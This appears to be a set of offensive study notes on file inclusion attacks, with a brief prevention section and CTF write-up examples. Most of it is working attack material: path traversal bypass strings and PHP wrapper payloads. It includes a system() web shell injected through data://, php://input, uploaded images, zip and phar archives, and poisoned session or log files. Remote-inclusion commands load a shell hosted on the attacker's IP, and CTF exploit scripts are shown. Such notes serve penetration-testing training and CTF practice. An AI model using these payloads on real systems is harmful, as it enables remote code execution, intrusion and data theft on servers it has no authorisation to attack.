
The following table shows which functions may execute files and which only read file content:

|  Function 	     |   Read Content 	 |       Execute 	         |   Remote URL|
|----------------|-----------------------|------------------------|-----------------|
|PHP |			
|include()/include_once() 	  |  ✅ 	       |         ✅ 	       |                  ✅|
|require()/require_once() 	  |  ✅ 	         |       ✅ 	             |            ❌|
|file_get_contents() 	     |   ✅ 	           |     ❌ 	        |                 ✅|
|fopen()/file() 	          |      ✅ 	         |       ❌              |              ❌|
|NodeJS 			|
|fs.readFile() 	         |       ✅ 	       |         ❌ 	          |               ❌|
|fs.sendFile() 	            |    ✅ 	        |        ❌ 	           |              ❌|
|res.render() 	        |        ✅ 	           |     ✅ 	        |                 ❌|
|Java 			|
|include 	          |          ✅ 	        |        ❌ 	          |               ❌|
|import 	              |          ✅ 	    |            ✅ 	     |                    ✅|
|.NET 			|
|@Html.Partial() 	      |      ✅ 	             |   ❌ 	           |              ❌|
@Html.RemotePartial() 	        ✅ 	                ❌ 	           |              ✅|
|Response.WriteFile() 	     |   ✅ 	             |   ❌ 	                 |        ❌|
|include 	             |       ✅ 	             |   ✅ 	                 |        ✅|




! Two common readable files that are available on most back-end servers are /etc/passwd on Linux and C:\Windows\boot.ini on Windows. 


# Path Traversal


we read a file by specifying its absolute path (e.g. /etc/passwd). This would work if the whole input was used within the include() function without any additions, like the following example:

```php
include($_GET['get_parameter']);
```

- web developers may append or prepend a string to the language parameter

```php
include("./languages/" . $_GET['language']);
```

- bypass this restriction by traversing directories using relative paths
- we can add `../` before our file name

- use this to go back several directories until we reach the root path and then specify the absolute file path `../../../../etc/passwd`



### Filename Prefix



```php
include("lang_" . $_GET['language']);
```

- the output is: `lang_../../../path`

- you can prepend your input with `/` to ommit the error.


## Appended Extensions




```php
include($_GET['language'] . ".php");
```

- bypass with something like `input%00`



## Basic Bypasses


#### Non-Recursive Path Traversal Filters

- search and replace filter deletes substrings of `../` 

```php
$language = str_replace('../', '', $_GET['language']);
```
- use `....//` ,  `..././` , `....\/` , `....////`


#### URL Encoding





#### Approved Paths

- web applications use Regular Expressions to test the path
```php
    if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
        include($_GET['language']);
    } else {
        echo 'Illegal path specified!';
    }
```
    
- bypass this with `/languages/../../../../input`







#### Path Truncation



- In earlier versions of PHP, defined strings have a maximum length of 4096 characters

- longer strings is passed, it will simply be truncated

- we might need to start the path with a non-existing directory for this technique to work.

 ```bash
 ?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times
 ```
 
 
 ```bash
 $ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
 ```




#### Null Byte (%00)

PHP versions before 5.5 were vulnerable to null byte injection, which means that adding a null byte (%00) at the end of the string would terminate the string and not consider anything after it. This is due to how strings are stored in low-level memory, where strings in memory must use a null byte to indicate the end of the string, as seen in Assembly, C, or C++ languages.



## PHP Filters



[PHP Wrappers](https://www.php.net/manual/en/wrappers.php.php) allow us to access different I/O streams at the application level, like standard input/output, file descriptors, and memory streams. 

`php://stdin` `php://stdout` `php://stderr` `php://memory` `php://filter` etc.


#### Input Filters

PHP Filters are a type of PHP wrappers, where we can pass different types of input and have it filtered by the filter we specify.

Syntax is as follows:

`php://filter/parameters`

There are four different types of filters available for use, which are: 
- [String Filters](https://www.php.net/manual/en/filters.string.php), 
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php), 
- [Compression Filters](https://www.php.net/manual/en/filters.compression.php),
- and [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)



#### Standard PHP Inclusion

- if you tried to include any php files through LFI,the included PHP file gets executed

- use **php://filter** to base64 encode the php file, and get the encoded source code

```php://filter/read=convert.base64-encode/resource=config```


- ! If the app appends .php at the end ,leave resource parameter for the end of the filter string this is if the app automatically appends .php in the end of the request ,else we will have to provide it


#### RCE with Data Wrapper



**! only available to use if the (allow_url_include) setting is enabled**

##### Test for allow_url_include
- include the PHP configuration file found at /etc/php/X.Y/apache2/php.ini for Apache 
- or at /etc/php/X.Y/fpm/php.ini for Nginx, where X.Y is your install PHP version


##### Exploit
```
$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```



```$ echo '<?php system($_GET["cmd"]); ?>' | base64```


Now, we can URL encode the base64 string, and then pass it to the data wrapper with data://text/plain;base64,. Finally, we can use pass commands to the web shell with &cmd=<COMMAND>: 
```
    $ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```



#### Input Wrapper

- **!depends on the allow_url_include setting**

- **Used for POST Requests**

Add the  web shell as POST data and pass  a GET parameter with the command to execute:

```$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid```


Note: To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use $_REQUEST). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. <\?php system('id')?>)

```$ curl -s -X POST --data '<?php system("id"); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input" ```



#### Expect Wrapper

- **Designed to execute commands**

- **expect is an external wrapper, so it needs to be manually installed and enabled**

```$ echo '<base64 encoded php.ini>' | base64 -d | grep expect```

##### Exploit


```$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"```






## RFI





### Verify RFI


- **check for the allow_url_include setting**

```
$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

- **include a local to the server file**

```
$ curl -X GET http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```


#### Get RCE with http

- Host the php web shell

```
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php

$ sudo python3 -m http.server <LISTENING_PORT>
```

- Include the remote file to the server

```http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id```



#### Get RCE with ftp

```$ sudo python -m pyftpdlib -p 21```

```http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id```


If the server requires valid authentication, then the credentials can be specified in the URL, as follows:

```$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'```


#### Get RCE with smb



```$ impacket-smbserver -smb2support share $(pwd)```

```http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami```




# LFI and File Uploads


- Image upload


`$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif`

Note: We are using a GIF image in this case since its magic bytes are easily typed, as they are ASCII characters, while other extensions have magic bytes in binary **that we would need to URL encode**.

- Find the path the image is saved

To include the uploaded file, we need to know the path to our uploaded file. In our case, if we inspect the source code


```<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">```


Note:  If we do not know where the file is uploaded, then we can fuzz for an uploads directory, and then fuzz for our uploaded file

- Include the image


```http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id```




#### Zip Wrapper

**this wrapper isn't enabled by default**

- If zip upload is allowed

``$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.zip shell.php``

- If the app blocks zip uploads by extension

``$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php``


- Include the file with the zip wrapper

```http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id```




## Phar Wrapper


write the following PHP script into a shell.php file:
```
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

This script can be compiled into a phar file that when called would write a web shell to a shell.txt sub-file, which we can interact with. We can compile it into a phar file and rename it to shell.jpg as follows:
```
$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```
we can call it with phar:// and provide its URL path, and then specify the phar sub-file with /shell.txt (URL encoded) to get the output of the command we specify with (&cmd=id)

```
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```





## Log Poisoning




#### PHP Session Poisoning

the web application can keep track of user details through their cookies. These details are stored in: 
- `/var/lib/php/sessions/` on ***Linux*** 
- `C:\Windows\Temp\` on ***Windows***.


the filename follows this name convention:

` name = sess_+{PHPSESSID}`

- include this session file 

```http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd```

- Poison arbitary values present in the file to confirm the log_poisoning attack

```
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```

- Poison the file with php code (URL Encoded)

```http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E```

- Include to execute the code

```http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd```




#### Server Log Poisoning


- Apache logs:
    - /var/log/apache2/ on ***Linux***
    - C:\xampp\apache\logs\ on ***Windows*** 

- Nginx logs: 
    - /var/log/nginx/ on ***Linux*** 
    - C:\nginx\log\ on ***Windows***




The logs ussually contains: 
- the remote IP address, 
- request page, 
- response code,
-  the User-Agent header (possibly poisonable)


##### Exploit 

```http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log```



Tip: The User-Agent header is also shown on process files under the Linux /proc/ directory. So, we can try including the /proc/self/environ or /proc/self/fd/N files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. 


- Other possible targets

    - /var/log/sshd.log
    - /var/log/mail
    - /var/log/vsftpd.log





## Automated Scanning


- Fuzzing Parameters

```$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287```


Tip: For a more precise scan, we can limit our scan to the most popular LFI parameters found on:

https://book.hacktricks.xyz/pentesting-web/file-inclusion#top-25-parameters




#### LFI wordlists


(https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)


```$ ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287```


#### Fuzzing Server Files


- Server Webroot


We may need to know the full server webroot path 


To do so, we can fuzz for the index.php file 
through common webroot paths, which we can find in this [wordlist]( https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt ) for Linux or this [wordlist](  https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt  ) for Windows. 


```$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287```









# File Inclusion Prevention

- avoid passing any user-controlled inputs into any file inclusion functions
- Whenever any of these functions is used, we should ensure that no user input is directly going into them
-  utilize a limited whitelist of allowed user inputs
    - create a whitelist that contains all existing paths used in the front-end
    - match each input string against it
- sanitize the user input to **recursively** remove any attempts of traversing directories
```
while(substr_count($input, '../', 0)) {
    $input = str_replace('../', '', $input);
};
```

- set `allow_url_fopen` and `allow_url_include` to Off if possible
- dissalow access outside the basedir
    - adding `open_basedir = /var/www` in the `php.ini` file




# Examples


## SimpleWaf corctf_2022

[challenge](https://github.com/Crusaders-of-Rust/corCTF-2022-public-challenge-archive/tree/master/web/simplewaf)

[writeup](https://brycec.me/posts/corctf_2022_challenges#simplewaf)


`'The first step is realizing that Express uses the qs npm module to provide req.query.file'`

this function in Node behaves like this:

Query string `?file[]='a'&file[]='b'` = `req.query.file = ['a','b']`

Query string `?file[a]='b'&file[c]='d'` = `req.query.file = {"a":"b" , "c" :"d" }


Also fs.readFileSync accepts strings, Urls and Buffer vars.

```
fs.readFileSync(new URL("file:///app/flag.txt")).toString() 
(output)
{flag.txt}
```

you can construct a URL in Node with the following elements:

-    .href exists
-    .origin exists
-    .protocol === 'file:'
-    .hostname === ''
-    .pathname  URL encoded (note: this needs to be double URL encoded since Express will already URL decode once)

like so :

`?file[href]=a&file[origin]=a&file[protocol]=file:&file[hostname]=&file[pathname]=/app/fl%2561g.txt`




# Tips n Tricks


### Inject to curl 


if you can inject strings to a curl command and you want to include a local file you can use [curl globbing](https://everything.curl.dev/cmdline/urls/globbing.html):


[exapme from SECCON CTF 2022](https://github.com/arkark/my-ctf-challenges/blob/main/challenges/202211_SECCON_CTF_2022_Quals/web/easylfi/build/web/app.py)
```
@app.route("/<path:filename>")
def index(filename: str = "index.html"):
    if ".." in filename or "%" in filename:
        return "Do not try path traversal :("
    try:
        proc = subprocess.run(
            ["curl", f"file://{os.getcwd()}/public/{filename}"],
            capture_output=True,
            timeout=1,
        )
    except subprocess.TimeoutExpired:
        return "Timeout"
```
you can pass 

`"http://localhost:3000/.{.}/.{.}/flag.txt"`

    ! URL Encode special chars like { , [ , & ect.

### Full URL in PATH (HTTP Request Line)

[nullctf2025-Codename Neigh 2](https://banua.medium.com/null-ctf-2025-writeup-1aa4f13e5709)

- Some webapps filter the string that prepends the path in the request

```ponylang

class F is RequestHandler
  let _fileauth: FileAuth
  
  new val create(fileauth: FileAuth) =>
    _fileauth = fileauth

  fun not_starts_with(s: String, prefix: String): Bool =>
    (s.size() >= prefix.size()) and (s.substring(0, prefix.size().isize()) != prefix)

  fun apply(ctx: Context): Context iso^ =>
    var conn: String = ""
    var body = "[REDACTED]".array()
    
    try
      conn = ctx.request.header("Host") as String
    end
    
    let path: String = ctx.request.uri().string()
    //body = ("[REDACTED] Path:" + path).array()

--->if (conn == "127.0.0.1") and not_starts_with(path, "flag") and not_starts_with(path, "/flag") then
      let fpath = FilePath(_fileauth, "private/flag.html")
      with file = File(fpath) do
        body = file.read_string(file.size()).string().array()
      end
    end

    ctx.respond(
      StatusResponse(StatusOK, [("Content-Length", body.size().string())]),
      body
    )
    consume ctx

```

- Some webservers though accept a full URL as a path

```python
req = (
    "GET http://127.0.0.1/flag HTTP/1.1\r\n"
    "Host: 127.0.0.1\r\n"
    "Connection: close\r\n"
    "\r\n"
)

s = socket.create_connection((HOST, PORT))
s.sendall(req.encode())
```

```python

URL = 'http://public.ctf.r0devnull.team:3003/'

class Exploit:
    def __init__(self, url=URL):
        self.url = url

    def getFlag(self):
        headers = {"Host": "127.0.0.1"}
        req = requests.get(urljoin(self.url, "////public.ctf.r0devnull.team:3003/flag"), headers=headers)
        return req.text
```
